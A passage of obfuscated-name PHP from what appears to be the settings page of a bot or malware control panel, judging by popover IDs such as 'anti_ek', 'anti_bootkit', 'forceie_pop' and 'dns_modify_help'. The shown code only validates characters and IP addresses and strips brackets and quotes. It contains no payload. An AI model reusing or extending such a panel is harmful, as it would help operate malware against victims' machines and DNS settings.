").popover();\n\t\t\$(\"#no_components\").popover();\n\t\t\$(\"#no_components_browser_only\").popover();\n\t\t\$(\"#no_components_until_contact\").popover();\n\t\t\$(\"#anti_ek\").popover();\n\t\t\$(\"#anti_bootkit\").popover();\n\t\t\$(\"#forceie_pop\").popover();\n\t\t\$(\"#dns_modify_help\").popover();\n\t}\n\t);\n\t\n";
if (isset($_GET["hi"]) && $_GET["hi"] == "dns") {
    echo "document.getElementById('dns_mod_focus').focus()\r\n";
}
echo "</script>";
function _obfuscated_0D342F2C27372937375B26040619191B5B283836320E22_($text_data = "", $is_blist = false)
{
    if (strlen($text_data) == 0) {
        return true;
    }
    for ($i = 0; $i < strlen($text_data); $i++) {
        $_obfuscated_0D1E080F390B340A3731162F2C0D25330B131F2A5B3F22_ = $text_data[$i];
        if (ctype_alnum($_obfuscated_0D1E080F390B340A3731162F2C0D25330B131F2A5B3F22_) == false && $_obfuscated_0D1E080F390B340A3731162F2C0D25330B131F2A5B3F22_ != "*" && $_obfuscated_0D1E080F390B340A3731162F2C0D25330B131F2A5B3F22_ != "." && $_obfuscated_0D1E080F390B340A3731162F2C0D25330B131F2A5B3F22_ != "-" && $_obfuscated_0D1E080F390B340A3731162F2C0D25330B131F2A5B3F22_ != " ") {
            if ($_obfuscated_0D1E080F390B340A3731162F2C0D25330B131F2A5B3F22_ == ":" && $is_blist) {
                continue;
            }
            return true;
        }
    }
    return false;
}
function _obfuscated_0D1B1732043C1D0A02350B211B0C321D0F0D3114390411_($ip)
{
    $_obfuscated_0D0F05371C05153023370C3F0A1F343831245C0C3F3901_ = strlen($ip);
    if ($_obfuscated_0D0F05371C05153023370C3F0A1F343831245C0C3F3901_ < 8 || 16 < $_obfuscated_0D0F05371C05153023370C3F0A1F343831245C0C3F3901_) {
        return false;
    }
    $_obfuscated_0D3F050D30240B163C1D1E01113134295B0A0623093511_ = explode(".", $ip);
    if ($_obfuscated_0D3F050D30240B163C1D1E01113134295B0A0623093511_) {
        $_obfuscated_0D073C342A191F17162A3C08385C2A2632030E1C081E22_ = count($_obfuscated_0D3F050D30240B163C1D1E01113134295B0A0623093511_);
        if ($_obfuscated_0D073C342A191F17162A3C08385C2A2632030E1C081E22_ != 4) {
            return false;
        }
        for ($i = 0; $i < $_obfuscated_0D073C342A191F17162A3C08385C2A2632030E1C081E22_; $i++) {
            if (is_numeric($_obfuscated_0D3F050D30240B163C1D1E01113134295B0A0623093511_[$i]) == false) {
                return false;
            }
            if (255 < (int) $_obfuscated_0D3F050D30240B163C1D1E01113134295B0A0623093511_[$i] || (int) $_obfuscated_0D3F050D30240B163C1D1E01113134295B0A0623093511_[$i] < 0) {
                return false;
            }
        }
        return true;
    }
    return false;
}
function _obfuscated_0D0535212B06172F35323F060C2B1E13192C140E5B4001_($srdata)
{
    $rdata = str_replace("<", "", $srdata);
    $rdata = str_replace(">", "", $rdata);
    $rdata = str_replace("'", "", $rdata);
    $rdata = str_replace("\"", "", $rdata);
    $rdata = str_replace(")", "", $rdata);
    $rdata = str_replace("(", "", $rdata);
    return $rdata;
}

?>